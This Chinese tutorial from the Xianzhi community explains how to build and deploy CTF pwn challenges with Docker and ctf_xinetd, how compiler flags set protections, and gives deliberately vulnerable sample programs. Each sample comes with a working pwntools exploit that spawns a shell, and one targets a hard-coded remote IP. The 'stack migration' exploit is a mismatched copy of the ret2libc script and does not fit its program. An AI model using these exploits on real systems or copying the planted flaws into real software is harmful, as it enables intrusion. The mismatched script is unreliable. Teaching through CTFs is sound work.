# CTF Pwn 题目设计指南-先知社区

> **来源**: https://xz.aliyun.com/news/19257  
> **文章ID**: 19257

---

## 前言

在出 Pwn 题的过程中，我发现网上现有的教程普遍不够完善，往往缺少从环境搭建到题目部署的完整流程。为弥补这一空白，本文将系统性地梳理整个出题过程，涵盖所需工具、具体操作步骤以及常见问题。当前大多数动态 Flag 的 Pwn 题目都基于开源项目 ctf\_xinetd 进行部署，该项目通过 xinetd 和 Docker 技术，将题目运行在低权限、隔离良好的环境中，有效提升了服务的安全性与稳定性。因此，建议在项目初期就深入理解其配置文件（如 `Dockerfile`、`ctf.xinetd` 和启动脚本）中各项参数的具体作用。

项目地址：<https://github.com/Eadom/ctf_xinetd>

## docker

### 构建命令

在 Pwn 题目的出题过程中，使用 Docker 构建隔离、可控的运行环境是最关键的一环。Docker 不仅能确保题目在不同平台下行为一致，还能有效限制权限、防止服务被恶意利用，是现代 CTF 出题的标准实践。本章节将介绍在出题流程中 Docker 的基本用法和常用命令。

安装 Docker 可以直接使用官方提供的安装脚本，并推荐通过国内镜像源加速下载。

```
curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
```

安装完成后，即可开始构建题目镜像。通常我们会编写一个 `Dockerfile` 来定义环境，然后通过以下命令构建镜像（假设当前目录下有 Dockerfile）：

```
docker build -t ctf-pwn .
```

构建成功后，使用如下命令启动容器，并将题目服务端口（如 9999）映射到宿主机：

```
docker run -d -p 9999:9999 --name pwn_test ctf-pwn
```

此时可通过本地连接测试题目是否正常运行：

```
nc 127.0.0.1 9999
```

如果程序无法正常运行，或怀疑缺少依赖库，可以进入正在运行的容器内部进行调试：

```
docker exec -it [CONTAINER ID] /bin/bash
```

### 常用命令

在反复测试和调整题目的过程中，经常需要管理镜像和容器。以下是几个常用的 Docker 命令（注意：大多数操作需 `sudo` 权限，并请务必区分“镜像”与“容器”的概念）：

* 列出本地所有镜像：

```
docker images
```

* 删除指定镜像：

```
docker rmi IMAGE_ID
```

* 查看所有容器（包括已停止的）：

```
docker ps -a
```

* 停止运行中的容器：

```
docker stop CONTAINER_ID
```

* 删除已停止的容器：

```
docker rm CONTAINER_ID
```

* 进入名为 `your_stack` 的容器进行交互式调试：

```
docker exec -it your_stack /bin/bash
```

* 退出容器终端（不影响容器运行）：按 `Ctrl+D` 或输入 `exit`

通过熟练掌握这些基础操作，出题者可以高效地搭建、调试和部署 Pwn 题目环境，为选手提供稳定且安全的挑战体验。

### Dockerfile

在 Pwn 题目出题过程中，若目标程序是 32 位的，构建 Docker 环境时必须特别注意其与 64 位程序在依赖库上的差异。32 位程序运行所需的动态链接库（如 `libc6:i386`、`libstdc++6:i386` 等）并不会默认安装在 64 位系统中，若遗漏这些依赖，程序在容器内运行时通常会报 “not found” 或类似错误，即使文件本身存在——这是因为缺少对应的 32 位运行时环境。因此，在编写 Dockerfile 时，务必显式启用 i386 架构并安装相应的 32 位兼容库。

以下是一个适用于 32 位 Pwn 程序的典型 Dockerfile 示例。你可以根据实际题目需求调整其中的配置和复制内容：

```
FROM ubuntu:22.04

RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list
RUN apt-get update && apt-get -y dist-upgrade
RUN apt-get update && apt-get install -y xinetd build-essential

RUN dpkg --add-architecture i386
RUN apt-get update && apt-get install -y libc6:i386 libncurses5:i386 libstdc++6:i386

RUN useradd -m ctf
WORKDIR /home/ctf
RUN cp -R /lib/i386-linux-gnu /home/ctf/
RUN cp -R /usr/lib/i386-linux-gnu /home/ctf/
RUN cp -R /usr/lib* /home/ctf

RUN mkdir /home/ctf/dev
RUN mknod /home/ctf/dev/null c 1 3
RUN mknod /home/ctf/dev/zero c 1 5
RUN mknod /home/ctf/dev/random c 1 8
RUN mknod /home/ctf/dev/urandom c 1 9
RUN chmod 666 /home/ctf/dev/*

#bin files
RUN mkdir /home/ctf/bin

RUN cp /bin/bash /home/ctf/bin
RUN cp /bin/sh /home/ctf/bin
RUN cp /usr/bin/timeout /home/ctf/bin
RUN cp /bin/ls /home/ctf/bin
RUN cp /bin/cat /home/ctf/bin


#remove not have
RUN rm -rf /home/ctf/lib/apt /home/ctf/lib/cpp /home/ctf/lib/gnupg /home/ctf/lib/init /home/ctf/lib/lsb /home/ctf/lib/os-release /home/ctf/lib/rsyslog /home/ctf/lib/tc /home/ctf/lib/udev /home/ctf/lib/binfmt.d /home/ctf/lib/dpkg /home/ctf/lib/gold-ld /home/ctf/lib/initramfs-tools /home/ctf/lib/ldscripts /home/ctf/lib/mime /home/ctf/lib/python2.7 /home/ctf/lib/systemd /home/ctf/lib/terminfo /home/ctf/lib/compat-ld /home/ctf/lib/gcc /home/ctf/lib/ifupdown /home/ctf/lib/insserv /home/ctf/lib/locale /home/ctf/lib/modules-load.d /home/ctf/lib/python3 /home/ctf/lib/tar /home/ctf/lib/tmpfiles.d


COPY ./ctf.xinetd /etc/xinetd.d/ctf
COPY ./start.sh /home/ctf
COPY ./bin/pwn /home/ctf
COPY ./flag /home/ctf
COPY ./flag.sh /tmp
RUN chmod 777 /tmp/flag.sh

RUN chmod +x /home/ctf/pwn
RUN chown ctf:ctf /home/ctf/pwn

RUN chmod +x /home/ctf/*
RUN chown -R root:ctf /home/ctf
RUN chmod -R 750 /home/ctf

RUN touch /home/ctf/*
RUN touch /home/ctf/*/*

RUN echo "Blocked by ctf_xinetd" > /etc/banner_fail
RUN echo 'ctf - nproc 1500' >>/etc/security/limits.conf

CMD exec /bin/bash -c "/etc/init.d/xinetd start; trap : TERM INT; sleep infinity & wait"

EXPOSE 9999

```

### 项目结构

一个标准的 Pwn 题目 Docker 目录通常包含以下文件：

![截屏2025-11-02 11.02.42.png](images/20251111104427-5721eef8-bea8-1.png)​

docker/：存放所有与容器构建相关的资源。

Dockerfile：定义镜像构建流程，包括基础镜像、依赖安装、文件复制、权限设置等。

bin/pwn：编译好的 32 位（或 64 位）漏洞程序，选手需对其进行逆向和利用。

ctf.xinetd：xinetd 服务配置文件，用于将 pwn 程序作为 TCP 服务暴露（传统方式）。

docker-compose.yml（可选）：若采用现代部署方式，可通过 Compose 管理端口映射、多服务协同等。

flag：静态 flag 文件，或由 flag.sh 动态生成后写入。

flag.sh：动态生成 flag 的脚本，常用于防止选手直接读取 flag 文件。

start.sh：容器启动时执行的初始化脚本，可用于设置环境变量、启动服务或加载动态 flag。

通过合理组织上述结构并正确配置 Dockerfile，可以高效、安全地部署一个符合 CTF 规范的 Pwn 题目环境。尤其对于 32 位程序，务必确认所有 i386 架构依赖均已安装，避免因“missing library”导致服务无法启动。

​

​

## 编译参数

在 Pwn 题目的开发过程中，编译参数的选择直接影响题目的难度、可利用性以及选手的攻击思路。不同的保护机制开启或关闭，会显著改变漏洞利用的方式。因此，出题者必须清楚每种编译选项的作用，并根据题目设计目标合理配置。以下是常见编译参数及其对 Pwn 利用的影响说明：

1. NX（No-eXecute）保护

控制栈（和堆）是否可执行，防止直接注入 shellcode。

* -z execstack：关闭 NX，栈可执行，允许直接运行 shellcode。
* -z noexecstack（默认）：开启 NX，栈不可执行，通常需使用 ROP（Return-Oriented Programming）绕过。

若题目希望考察 ROP 技巧，应开启 NX；若面向初学者或考察 shellcode 编写，则可关闭

​

2. Stack Canary（栈保护）

在函数返回前检查栈中插入的“cookie”值，防止栈溢出覆盖返回地址。

* -fno-stack-protector：关闭 Canary，无保护。
* -fstack-protector：开启部分保护，仅对包含 char 数组或调用 alloca 的函数插入 canary。
* -fstack-protector-all：全函数保护，所有函数都插入 canary。

注意：开启 Canary 后，编译器可能会调整局部变量在栈中的布局（例如将缓冲区放在 canary 之后），这会影响溢出偏移的计算。此外，泄露 canary 值常成为利用的关键步骤。

​

3. PIE（Position Independent Executable）与 ASLR

启用 PIE 后，程序的代码段、数据段等基地址在每次运行时随机化，配合系统 ASLR 提高安全性。

-no-pie：关闭 PIE，程序加载地址固定（如 0x400000），便于静态分析和硬编码地址。  
-pie：开启 PIE，所有地址动态变化，通常需先泄露某个地址（如 libc 或程序本身）来计算基址。  
开启 PIE 后，程序中可能出现 \_\_x86.get\_pc\_thunk 等辅助函数（32 位下用于获取当前指令地址），这是位置无关代码的典型特征。

​

4. RELRO（Relocation Read-Only）

控制 GOT（Global Offset Table）表在程序启动后的可写性。

* -z norelro：关闭 RELRO，GOT 表全程可写，可被 hijack（如 GOT 覆写）。
* -z lazy（部分 RELRO，默认）：程序启动后 .got.plt 仍可写，.got 只读。
* -z now（完全 RELRO）：程序启动时完成所有重定位，GOT 全部设为只读，无法通过修改 GOT 劫持函数。

完全 RELRO 会显著增加利用难度，尤其限制了传统的 GOT overwrite 攻击手法。

​

5. 其他常用参数

* -m32：编译为 32 位程序。相比 64 位，寄存器少、调用约定简单、地址不含 null 字节问题较少，更适合教学和入门题目。
* -s：去除符号表，增大逆向难度，隐藏函数名（但不影响动态链接符号）。

## 题目示例

下面列举几个典型的 Pwn 题目示例，它们的源码开头注释中通常已注明推荐的编译命令。这类完整、可运行的 Pwn 题源码在网上较为稀缺，因此非常适合作为出题模板——只需在原有基础上稍作修改，就能快速生成一道新题。

建议出题时遵循“先本地、后远程”的原则：先在本地环境中完整打通利用链，确保漏洞可触发、Flag 能正常返回；确认无误后，再将程序部署到 Docker 容器中进行远程测试。这一步至关重要，因为本地能跑通的程序，在容器中可能因环境差异而失败。）

### 签到题

```
// 静态编译
// gcc -fno-stack-protector -z execstack -no-pie -m32 -static -o pwn pwn.c
// 非静态编译
// gcc -fno-stack-protector -z execstack -no-pie -m32 -o pwn pwn.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 后门函数：直接返回 shell（用于演示）
void backdoor() {
    system("/bin/sh");
}

// 存在漏洞的函数
void vulnerable_function() {
    char buffer[64];  // 64 字节的栈缓冲区
    puts("Please input your message:");
    gets(buffer);     // 危险！gets() 不检查输入长度 → 栈溢出
    printf("You said: %s
", buffer);
}

int main() {
    setbuf(stdout, NULL);  // 禁用输出缓冲，便于交互
    puts("Welcome to the vulnerable program!");
    vulnerable_function();
    puts("Goodbye!");
    return 0;
}

```

#### poc

```
from pwn import *

# 启动程序
p = process('./pwn')

# 获取 backdoor 地址（32位小端）
backdoor_addr = 0x080491B6  # 替换为你实际的地址

# 构造 payload: 68字节填充 + backdoor地址
payload = b"A" * 76 + p32(backdoor_addr)

# 发送 payload
p.sendline(payload)

# 交互式 shell
p.interactive()
```

​

### 格式化字符串

```
// gcc -m32 -o pwn pwn.c -fno-stack-protector -z execstack
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>
void timeout(){
    write(1,"timeout!
",9);
    exit(0);
}

void init(){
    alarm(30);
    signal(SIGALRM,timeout);
}

void menu(){
    puts("welcome to my servvvvvvvvvvvvver!!!!!");
    puts("here you can:");
    puts("1.get time");
    puts("2.get flag");
    fflush(0);
}

void get_time(){
    system("TZ=CST-8 date");
}

void get_flag(){
    char buffer[0x100];
    puts("give me flag!");
    fflush(0);
    read(0,buffer,0x100);
    printf("ok, flag is ");
    printf(buffer);
    printf(":)
");
    fflush(0);
}

int main(int argc,char* argv[]){
    init();
    char select[2];
    while(1){
        menu();
        read(0,&select,2);
        switch(atoi(&select)){
        case 1:
            get_time();
            break;
        case 2:
            get_flag();
            break;
        default:
            printf("???
");
            fflush(0);
        }
    }
}


```

#### poc

```
from pwn import *
#context.log_level = 'debug'
libc = ELF('/lib32/libc.so.6')
pwn4 = ELF('pwn')
def exec_fmt(payload):
    print cn.recvuntil('flag
')
    cn.sendline('2')
    print cn.recvuntil('flag!
')
    cn.send(payload)
    cn.recvuntil('is ')
    ret = cn.recvline()
    return ret

#cn = process('pwn')
cn = remote('121.42.206.184',10002)
#get fmt length
auto_fmt = FmtStr(exec_fmt)
print '
get fmt length######'

#///////////////////////// leak p_printf
print cn.recv()
cn.sendline('1')
print cn.recv()
cn.sendline('2')
print cn.recvuntil('flag!
')
cn.send(p32(pwn4.got['system'])+'START%7$sEND')
cn.recvuntil("START")
p_system = u32(cn.recv()[:4])
print '
##########p_system'+hex(p_system)
chg_got = fmtstr_payload(auto_fmt.offset, {pwn4.got['printf']: p_system})
cn.sendline('2')
print cn.recvuntil('flag!
')
cn.send(chg_got)
print cn.recv()
cn.sendline('2')
print cn.recvuntil('flag!
')
cn.send('/bin/sh\x00')
cn.interactive()
```

### ret2libc

```
//gcc -m32 -g -fno-stack-protector -z noexecstack -no-pie -Wl,-z,relro,-z,now -o pwn pwn.c
#include <stdio.h>
#include <string.h>

void SayHello()
{
    char tmpName[10];
    char name[1024];
    puts("hello");
    scanf("%1024s", name);
    strcpy(tmpName, name);
}

int main(int argc, char** argv)
{
    SayHello();
    return 0;
}
```

#### poc

```
#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *

context.log_level = 'debug'
context(arch='i386', os='linux')
# 设置tmux程序
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']

# program module
io = process('./vuln6')
elf = ELF('./vuln6')
lib = ELF("/lib/i386-linux-gnu/libc.so.6")

# vuln address
SayHello = elf.symbols['SayHello']
# 程序的got表地址
libc_start_main_got = elf.got['__libc_start_main']
# 方法2利用pwntool的ELF模块之间获取
lib_start_main = lib.symbols['__libc_start_main']
log.success("SayHello:" + str(hex(SayHello)))

# 这里开始调试
gdb.attach(io,'b *0x08048486')
pause()

# 利用栈溢出调用puts函数泄漏got表地址
payload1 = 'A'*0x16 + p32(elf.plt['puts']) + p32(SayHello) + p32(libc_start_main_got)
# payload1 = 'A'*0x16 + 'B'*4
# 格式化字符串可以利用栈上的残留来获取
io.sendlineafter('hell', payload1)
# 有时候没办法获取的时候加多一个,因为可能有一些垃圾数据
print("start")
print(io.recvuntil('n'))
print("end")
lib_main = u32(io.recvline()[0:4])
libc_base = lib_main - lib_start_main
log.success("libc_base:" + str(hex(libc_base)))

# 经典retlibc利用公式
retAddress = p32(0xdeadbeef)
system = libc_base + lib.symbols['system']
binsh = libc_base + lib.search("/bin/sh").next()
payload2 = 'A'*0x16 + p32(system) + retAddress + p32(binsh)
io.sendlineafter('hello', payload2)
io.interactive()
```

### 栈迁移

```
// gcc -fno-stack-protector -no-pie -z execstack -z norelro -o pwn pwn.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include <signal.h>
 
void sig_handler(int num)
{
    printf("hurry baby!!
");
    exit(0);
}
void set_up(){
        signal(SIGALRM, sig_handler);
        alarm(5);
}
void pwn(){
    system("echo SCUCTF{fake_flag_hahahahhahaha_bendan}");
}
void vul(){
    char s[0x20];
    printf("Give you a stack addr:%p
",&s);
    memset(s,0,0x20);
    puts("SCUCTF:");
    read(0,s,0x30);
    return;
}
int main(){
    setbuf(stdout,0);
    setbuf(stderr,0);
    setbuf(stdin,0);
    //set_up();
    puts("Stack migration is a very useful skill!");
    vul();
    return 0;
}
```

#### poc

```
#!/usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *

context.log_level = 'debug'
context(arch='i386', os='linux')
# 设置tmux程序
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']

# program module
io = process('./pwn')
elf = ELF('./pwn')
lib = ELF("/lib/i386-linux-gnu/libc.so.6")

# vuln address
SayHello = elf.symbols['SayHello']
# 程序的got表地址
libc_start_main_got = elf.got['__libc_start_main']
# 方法2利用pwntool的ELF模块之间获取
lib_start_main = lib.symbols['__libc_start_main']
log.success("SayHello:" + str(hex(SayHello)))

# # 这里开始调试
# gdb.attach(io,'b *0x08048486')
# pause()

# 利用栈溢出调用puts函数泄漏got表地址
payload1 = b'A'*0x16 + p32(elf.plt['puts']) + p32(SayHello) + p32(libc_start_main_got)
# payload1 = 'A'*0x16 + 'B'*4
# 格式化字符串可以利用栈上的残留来获取
io.sendlineafter(b'hell', payload1)
# 有时候没办法获取的时候加多一个,因为可能有一些垃圾数据
print("start")
print(io.recvuntil('
'))
print("end")
lib_main = u32(io.recvline()[0:4])
libc_base = lib_main - lib_start_main
log.success("libc_base:" + str(hex(libc_base)))

# 经典retlibc利用公式
retAddress = p32(0xdeadbeef)
system = libc_base + lib.symbols['system']
# Python3: generator has no .next() method — use the builtin next()
binsh = libc_base + next(lib.search(b"/bin/sh"))
payload2 = b'A'*0x16 + p32(system) + retAddress + p32(binsh)
io.sendlineafter(b'hello', payload2)
io.interactive()
```

## 常见问题

### 缺少相关库

在部署 Pwn 题目时，经常会遇到程序无法正常运行的情况，尤其是在使用 32 位二进制文件时。这是因为 Docker 镜像默认不会自动包含程序所需的动态链接库——Dockerfile 在构建过程中并不会“抓取”这些依赖。

![截屏2025-11-03 11.12.49.png](images/20251111104427-577a83ec-bea8-1.png)

解决办法：

在本地编译完成后，使用 `ldd` 命令查看程序具体依赖哪些共享库。

根据输出结果，在 Dockerfile 中显式安装对应的依赖包（对于 32 位程序，通常需要启用 i386 架构并安装 `:i386` 版本的库）。

### 静态链接

在出 Pwn 题时，不建议将漏洞程序进行静态编译（例如使用 `gcc -static`）。虽然静态链接可以避免动态库依赖问题，但它可能带来一个隐蔽而严重的问题：本地能打通，远程却打不通。

原因在于，静态链接只会包含程序中实际被调用的函数代码。如果某些关键函数（如 `system`、`execve`、`open` 等）在主程序逻辑中未被显式调用，链接器可能会将其优化掉，导致这些函数在最终的二进制文件中不可用。然而，在漏洞利用过程中，选手往往依赖这些“未被调用但存在”的函数来执行后门操作（例如 `ret2libc` 或 `one_gadget`）。一旦它们缺失，即使 ROP 链构造正确，远程利用也会失败。

### not found

有时在连接题目时会遇到程序报错 `not found`，如下图所示。

![截屏2025-11-03 22.19.28.png](images/20251111104428-57b862c0-bea8-1.png)

乍看之下，似乎是某个命令（例如 `timeout`）不存在，但实际上该命令本身是存在的，问题出在其依赖的动态链接库缺失。

![截屏2025-11-03 22.25.09.png](images/20251111104428-57dad40c-bea8-1.png)

这种情况通常与 `xinetd` 的运行环境有关。在基于 `ctf_xinetd` 的 Docker 构建流程中，为了提升安全性，往往会主动删除大量系统目录（如 `/lib`, `/usr/lib` 中的非必要内容）。虽然这能缩小攻击面，但也可能误删 `timeout`、`sh`、`cat` 等常用命令所依赖的共享库（如 `libc.so.6` 或 `ld-linux.so.2`）。
